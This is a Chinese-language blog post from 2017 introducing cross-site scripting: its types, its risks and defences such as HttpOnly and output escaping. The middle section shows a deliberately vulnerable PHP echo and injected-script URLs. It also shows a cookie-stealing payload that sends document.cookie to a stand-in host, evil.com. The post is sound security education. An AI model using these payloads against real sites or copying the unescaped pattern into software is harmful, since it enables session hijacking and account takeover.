@@ -1,0 +1,704 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="前段时间在学习Web安全方面的知识，对这方面有了进一步的了解，决定写文章记录下来，只是对Web安全方面知识的一些总结，没有太多的深度。    XSS攻击简介跨站脚本攻击(XSS),英文全称 Cross Site Script, 是Web安全头号大敌。XSS攻击，一般是指黑客通过在网页中注入恶意脚本，当用户浏览网页时，恶意脚本执行，控制用户浏览器行为的一种攻击方式。其中，XSS攻击通常分为反射型X">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web安全系列——XSS攻击">
+<meta property="og:url" content="http://yoursite.com/2017/11/11/Web安全系列——XSS攻击/index.html">
+<meta property="og:site_name" content="邱振源的博客">
+<meta property="og:description" content="前段时间在学习Web安全方面的知识，对这方面有了进一步的了解，决定写文章记录下来，只是对Web安全方面知识的一些总结，没有太多的深度。    XSS攻击简介跨站脚本攻击(XSS),英文全称 Cross Site Script, 是Web安全头号大敌。XSS攻击，一般是指黑客通过在网页中注入恶意脚本，当用户浏览网页时，恶意脚本执行，控制用户浏览器行为的一种攻击方式。其中，XSS攻击通常分为反射型X">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://wx4.sinaimg.cn/mw690/857afa84gy1flfq8adc1hj20dx03y3yk.jpg">
+<meta property="og:image" content="https://wx4.sinaimg.cn/mw690/857afa84gy1flfq8q6g7bj20ok03h0ss.jpg">
+<meta property="og:updated_time" content="2017-11-13T15:00:32.206Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Web安全系列——XSS攻击">
+<meta name="twitter:description" content="前段时间在学习Web安全方面的知识，对这方面有了进一步的了解，决定写文章记录下来，只是对Web安全方面知识的一些总结，没有太多的深度。    XSS攻击简介跨站脚本攻击(XSS),英文全称 Cross Site Script, 是Web安全头号大敌。XSS攻击，一般是指黑客通过在网页中注入恶意脚本，当用户浏览网页时，恶意脚本执行，控制用户浏览器行为的一种攻击方式。其中，XSS攻击通常分为反射型X">
+<meta name="twitter:image" content="https://wx4.sinaimg.cn/mw690/857afa84gy1flfq8adc1hj20dx03y3yk.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.2',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/11/11/Web安全系列——XSS攻击/"/>
+
+
+
+
+
+  <title>Web安全系列——XSS攻击 | 邱振源的博客</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">邱振源的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/11/11/Web安全系列——XSS攻击/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Zhenyuan Qiu">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="邱振源的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Web安全系列——XSS攻击</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-11T16:57:30+08:00">
+                2017-11-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<p>前段时间在学习Web安全方面的知识，对这方面有了进一步的了解，决定写文章记录下来，只是对Web安全方面知识的一些总结，没有太多的深度。  </p>
+</blockquote>
+<h2 id="XSS攻击简介"><a href="#XSS攻击简介" class="headerlink" title="XSS攻击简介"></a>XSS攻击简介</h2><p>跨站脚本攻击(XSS),英文全称 Cross Site Script, 是Web安全头号大敌。<br>XSS攻击，一般是指黑客通过在网页中<strong>注入恶意脚本</strong>，当用户浏览网页时，恶意脚本执行，控制用户浏览器行为的一种攻击方式。其中，XSS攻击通常分为反射型XSS、存储型XSS、DOM Based XSS三种。可以通过以下例子看看XSS攻击是如何产生的。<br><a id="more"></a></p>
+<h2 id="一个简单的例子"><a href="#一个简单的例子" class="headerlink" title="一个简单的例子"></a>一个简单的例子</h2><p>本地服务器的的/xssTest 目录下，有一个test.php文件，代码如下：</p>
+<pre><code>&lt;?php
+    $userName=$_GET[&apos;userName&apos;];                    //获取用户输入的参数
+    echo &quot;&lt;b&gt;&quot;.$userName.&quot;&lt;/b&gt;&quot;;                    //直接输出用户的参数给前端页面
+?&gt;
+</code></pre><p>正常情况下，用户提交的姓名可以正确显示在页面上，不会构成XSS攻击，比如，当用户访问以下URL：</p>
+<pre><code>http://localhost/xssTest/test.php?userName=jack
+</code></pre><p>页面会显示：<br><img src="https://wx4.sinaimg.cn/mw690/857afa84gy1flfq8adc1hj20dx03y3yk.jpg" alt="正常显示"><br>可以看到，用户在URL中输入的参数正常显示在页面上。  </p>
+<p>然后，我们尝试在URL中<strong>插入JavaScript代码</strong>，如：  </p>
+<pre><code>http://localhost/xssTest/test.php?userName=&lt;script&gt;window.open(http://www.baidu.com)&lt;/script&gt;
+</code></pre><p>则页面会显示：<br><img src="https://wx4.sinaimg.cn/mw690/857afa84gy1flfq8q6g7bj20ok03h0ss.jpg" alt="插入恶意脚本">    </p>
+<p>可以看到，页面没有把userName后面的内容显示出来，而且打开了一个新的标签页,原因是在URL中带有一段打开另一标签页的恶意脚本。<br>这个例子虽然简短，但体现了最简单的XSS攻击的完整流程。  </p>
+<h2 id="XSS攻击类型"><a href="#XSS攻击类型" class="headerlink" title="XSS攻击类型"></a>XSS攻击类型</h2><p>根据攻击的方式，XSS攻击可以分为三类：反射型XSS、存储型XSS、DOM Based XSS。</p>
+<p><strong>反射型XSS</strong>也被称为非持久性XSS,这种攻击方式把XSS的Payload写在URL中，通过浏览器直接“反射”给用户。这种攻击方式通常需要诱使用户点击某个恶意链接，才能攻击成功。<br><strong>存储型XSS</strong>又被称为持久性XSS,会把黑客输入的恶意脚本存储在服务器的数据库中。当其他用户浏览页面包含这个恶意脚本的页面，用户将会受到黑客的攻击。一个常见的场景就是黑客写下一篇包含恶意JavaScript脚本的博客文章，当其他用户浏览这篇文章时，恶意的JavaScript代码将会执行。<br><strong>DOM Based XSS</strong> 是一种利用前端代码漏洞进行攻击的攻击方式。前面的反射型XSS与存储型XSS虽然恶意脚本的存放位置不同，但其本质都是利用后端代码的漏洞。<br>反射型和存储型xss是服务器端代码漏洞造成的，payload在响应页面中，DOM Based中，payload不在服务器发出的HTTP响应页面中，当客户端脚本运行时（渲染页面时），payload才会加载到脚本中执行。</p>
+<h2 id="XSS攻击的危害"><a href="#XSS攻击的危害" class="headerlink" title="XSS攻击的危害"></a>XSS攻击的危害</h2><p>我们把进行XSS攻击的恶意脚本成为XSS Payload。XSS Payload的本质是JavaScript脚本，所以JavaScript可以做什么，XSS攻击就可以做什么。<br>一个最常见的XSS Payload就是盗取用户的Cookie,从而发起Cookie劫持攻击。Cookie中，一般会保存当前用户的登录凭证，如果Cookie被黑客盗取，以为着黑客有可能通过Cookie直接登进用户的账户，进行恶意操作。<br>如下所示，攻击者先加载一个远程脚本：  </p>
+<pre><code>http://localhost/xssTest/test.php?userName=&lt;scriipt src=http://www.evil.com/evil.js&gt;&lt;/script&gt;  
+</code></pre><p>而真正的XSS Payload，则写在远程脚本evil.js中。在evil.js中，可以通过下列代码窃取用户Cookie：</p>
+<pre><code>var img=document.createElement(&quot;img&quot;);
+img.src=&quot;http://www.evil.com/log?&quot;+escape(document.cookie);  
+document.body.appendChild(img);  
+</code></pre><p>这段代码插入了一张看不见的图片，同时把document.cookie作为参数，发到远程服务器。黑客在拿到cookie后，只需要替换掉自身的cookie，就可以登入被盗取者的账户，进行恶意操作。<br>一个网站的应用只需要接受HTTP的POST请求和GET请求，就可以完成所有的操作，对于黑客而言，仅通过JavaScript就可以完成这些操作。  </p>
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>其实如今一些流行的浏览器都内置了一些对抗XSS的措施，比如Firefox的CSP、IE 8内置的XSS Filter等。除此之外，还有以下防御手段</p>
+<h3 id="HttpOnly"><a href="#HttpOnly" class="headerlink" title="HttpOnly"></a>HttpOnly</h3><p>HttpOnly最早是由微软提出，并在IE6中实现的，至今已逐渐成为一个标准。浏览器将禁止页面的JavaScript访问带有HttpOnly 属性的Cookie。以下浏览器开始支持HttpOnly:  </p>
+<ul>
+<li>Microsoft IE 6 SP1+  </li>
+<li>Mozilla FireFox 2.0.0.5+  </li>
+<li>Mozilla Firefox 3.0.0.6+  </li>
+<li>Google Chrome  </li>
+<li>Apple Safari 4.0+  </li>
+<li>Opera 9.5+</li>
+</ul>
+<p>一个Cookie的使用过程如下：<br>Step1: 浏览器向服务器发送请求，这时候没有cookie。<br>Step2: 服务器返回同时，发送Set-Cookie头，向客户端浏览器写入Cookie。<br>Step3: 在该Cookie到期前，浏览器访问该域名下所有的页面，都将发送该Cookie。<br>而HttpOnly是在Set-Cookie时标记的。      </p>
+<h3 id="输入检查"><a href="#输入检查" class="headerlink" title="输入检查"></a>输入检查</h3><p>常见的Web漏洞，如XSS、SQL注入等，都要求攻击者构造一些特殊的字符串，而这些字符串是一般用户不会用到的，所以进行输入检查就很有必要了。<br>输入检查可以在用户输入的<strong>格式检查</strong>中进行。很多网站的用户名都要求是字母及数字的组合如“abc1234”，其实也能过滤一部分的XSS和SQL注入。但是，这种在客户端的限制很容易<strong>被绕过</strong>，攻击者可以用JavaScript或一些请求工具，直接构造请求，想网站注入XSS或者SQL。所以，除了在客户端进行格式检查，往往还需要在后端进行二次检查。客户端的检查主要作用是阻挡大部分误操作的正常用户，从而节约服务器资源。  </p>
+<h3 id="对输出转义"><a href="#对输出转义" class="headerlink" title="对输出转义"></a>对输出转义</h3><p>在输出数据之前对潜在的威胁的字符进行编码、转义是防御XSS攻击十分有效的措施。</p>
+<ol>
+<li>为了对抗XSS,在HtmlEncode中至少转换以下字符：</li>
+</ol>
+<p>&lt; 转成 <code>&amp;lt</code>;</p>
+<p><code>&gt;</code> 转成 <code>&amp;gt</code>;</p>
+<p>&amp; 转成 <code>&amp;amp</code>;</p>
+<p>“ 转成 <code>&amp;quot</code>;</p>
+<p>‘ 转成 <code>&amp;#39</code>  </p>
+<hr>
+<p>参考链接：<br><a href="https://www.zhihu.com/question/26628342" title="DOM-based XSS 与存储性 XSS、反射型 XSS 有什么区别？" target="_blank" rel="external">https://www.zhihu.com/question/26628342</a></p>
+<p>《白帽子讲Web安全》</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/09/24/常用密码学技术/" rel="next" title="常用密码学技术">
+                <i class="fa fa-chevron-left"></i> 常用密码学技术
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          
+            <p class="site-author-name" itemprop="name">Zhenyuan Qiu</p>
+            <p class="site-description motion-element" itemprop="description"></p>
+        </div>
+
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+            
+              <a href="/archives/">
+            
+                <span class="site-state-item-count">3</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              
+                <span class="site-state-item-count">2</span>
+                <span class="site-state-item-name">分类</span>
+              
+            </div>
+          
+
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS攻击简介"><span class="nav-number">1.</span> <span class="nav-text">XSS攻击简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一个简单的例子"><span class="nav-number">2.</span> <span class="nav-text">一个简单的例子</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS攻击类型"><span class="nav-number">3.</span> <span class="nav-text">XSS攻击类型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS攻击的危害"><span class="nav-number">4.</span> <span class="nav-text">XSS攻击的危害</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防御"><span class="nav-number">5.</span> <span class="nav-text">防御</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#HttpOnly"><span class="nav-number">5.1.</span> <span class="nav-text">HttpOnly</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#输入检查"><span class="nav-number">5.2.</span> <span class="nav-text">输入检查</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#对输出转义"><span class="nav-number">5.3.</span> <span class="nav-text">对输出转义</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Zhenyuan Qiu</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by  <a class="theme-link" href="https://hexo.io">Hexo</a> </div>
+
+  <span class="post-meta-divider">|</span>
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.2</div>
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
